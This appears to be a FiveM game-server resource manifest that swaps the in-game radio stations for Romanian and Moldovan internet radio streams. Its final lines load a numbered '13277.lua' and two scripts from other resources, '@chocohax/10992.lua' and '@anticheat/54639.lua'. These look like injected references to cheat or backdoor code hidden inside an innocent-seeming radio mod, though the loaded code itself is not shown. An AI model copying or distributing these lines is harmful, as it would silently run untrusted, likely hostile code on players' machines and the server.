resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

-- Example custom radios
supersede_radio "RADIO_03_HIPHOP_NEW" { url = "http://37.59.207.68:8000/;stream.mp3", volume = 0.10, name = "HIPHOP"}
--supersede_radio "RADIO_02_POP" { url = "http://a.fmradiomanele.ro:8054/stream?type=http&nocache=378", volume = 0.10, name = "Manele 2021"}
supersede_radio "RADIO_06_COUNTRY" { url = "http://petrecere.fmradiomanele.ro:8000/stream?type=http&nocache=183317", volume = 0.10, name = "Manele De Petrecere"}
supersede_radio "RADIO_05_TALK_01" { url = "http://80.86.106.143:9128/kissfm.aacp", volume = 0.10, name = "Kiss FM"}
supersede_radio "RADIO_04_PUNK" { url = "http://edge126.rdsnet.ro:84/profm/profm.mp3", volume = 0.10, name = "PRO FM"}
supersede_radio "RADIO_09_HIPHOP_OLD" { url = "http://stream.radiozu.ro:8020", volume = 0.10, name = "RADIO ZU"}
supersede_radio "RADIO_12_REGGAE" { url = "http://167.114.207.234:8888/stream", volume = 0.10, name = "MUZICA POPULARA"}
supersede_radio "RADIO_13_JAZZ" { url = "http://edge126.rdsnet.ro:84/profm/profm.mp3", volume = 0.10, name = "PRO FM"}
supersede_radio "RADIO_14_DANCE_02" { url = "http://stream2.srr.ro:8002/;", volume = 0.10, name = "ROMANIA ACTUALITATI"}
supersede_radio "RADIO_15_MOTOWN" { url = "http://asculta.radiohitfm.net:8340/;", volume = 0.10, name = "RADIO HITFM MANELE"}
supersede_radio "RADIO_20_THELAB" { url = "http://edge76.rdsnet.ro:84/digifm/digifm.mp3", volume = 0.10, name = "DIGI FM"}
supersede_radio "RADIO_16_SILVERLAKE" { url = "http://a.fmradiomanele.ro:8054/stream?type=http&nocache=378", volume = 0.10, name = "Manele"}
supersede_radio "RADIO_17_FUNK" { url = "http://live.aquarelle.md:8000/aquarellefm.mp3", volume = 0.10, name = "Aquarelle FM MOLDOVA"}
supersede_radio "RADIO_18_90S_ROCK" { url = "http://stream.radiozu.ro:8020", volume = 0.10, name = "RADIO ZU"}
files {
	"index.html"
}

ui_page "index.html"

client_scripts {
	"data.js",
	"13277.lua",
	"client.js"
}
client_script '@chocohax/10992.lua'
client_script '@anticheat/54639.lua'